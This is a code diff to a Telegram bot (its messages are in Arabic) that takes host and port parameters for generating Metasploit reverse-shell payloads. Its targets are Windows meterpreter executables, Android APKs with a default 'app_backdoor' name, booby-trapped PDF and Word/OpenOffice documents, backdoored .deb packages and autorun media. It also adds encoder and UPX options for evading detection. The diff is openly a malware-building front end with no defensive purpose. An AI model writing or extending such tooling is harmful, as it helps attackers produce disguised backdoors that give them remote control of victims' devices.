@@ -17,6 +17,7 @@ from pathlib import Path
 import aiofiles
 import aiohttp
 from datetime import datetime, timedelta
+import ipaddress
 
 import httpx
 from dotenv import load_dotenv
@@ -635,15 +636,36 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
         return ConversationHandler.END
     parts = update.message.text.strip().split()
+
     if sess.kind in ("payload", "listener"):
-        if len(parts) < 2 + (1 if sess.kind == "payload" else 0):
-            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]")
+        # Validate basic host/port
+        need_output = (sess.kind == "payload")
+        min_parts = 3 if need_output else 2
+        if len(parts) < min_parts:
+            await update.message.reply_text("الاستخدام: LHOST LPORT{}".format(" OUTPUT_NAME" if need_output else ""))
             return PARAMS
         lhost, lport = parts[:2]
         if not _valid_host(lhost) or not _valid_port(lport):
             await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
             return PARAMS
-    if sess.kind == "android" and not sess.adv:
+        if sess.kind == "payload":
+            output_name = parts[2]
+            payload = "windows/meterpreter/reverse_tcp"
+            sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+        else:
+            payload = "windows/meterpreter/reverse_tcp"
+            sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
+    elif sess.kind == "winexe":
+        # advanced windows exe
+        if len(parts) < 6:
+            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
+            return PARAMS
+        lhost, lport, output_name, arch, encoders, upx = parts[:6]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
+        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
+    elif sess.kind == "android" and not sess.adv:
         if len(parts) < 2:
             await update.message.reply_text("الاستخدام: LHOST LPORT")
             return PARAMS
@@ -651,11 +673,16 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not _valid_host(lhost) or not _valid_port(lport):
             await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
             return PARAMS
+        payload = "android/meterpreter/reverse_tcp"
+        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     elif sess.kind == "android" and sess.adv:
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
             return PARAMS
         mode, perm, lhost, lport = parts[:4]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
         output_name = parts[4] if len(parts) >= 5 else "app_backdoor"
         ks_block = parts[5] if len(parts) >= 6 else ""
         sess.params = {"mode": mode, "perm_strategy": perm, "lhost": lhost, "lport": lport, "output_name": output_name, "payload": "android/meterpreter/reverse_tcp"}
@@ -671,8 +698,8 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lport = parts[1] if len(parts) >= 2 else ""
         output_name = parts[2] if len(parts) >= 3 else "document"
         base_pdf = parts[3] if len(parts) >= 4 else ""
-        if not lhost or not lport:
-            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]")
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
             return PARAMS
         sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": "windows/meterpreter/reverse_tcp"}
         if base_pdf:
@@ -683,16 +710,18 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return PARAMS
         target, lhost, lport, output_name = parts[:4]
         valid = {"ms_word_windows","ms_word_mac","openoffice_windows","openoffice_linux"}
-        if target not in valid:
-            await update.message.reply_text("TARGET غير صحيح. استخدم: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux")
+        if target not in valid or not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("مدخلات غير صحيحة.")
             return PARAMS
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
+        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": "windows/meterpreter/reverse_tcp", "output_name": output_name}
     elif sess.kind == "deb":
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
             return PARAMS
         deb_path, lhost, lport, output_name = parts[:4]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
         sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
     elif sess.kind == "autorun":
         exe_path = parts[0] if len(parts) >= 1 else ""
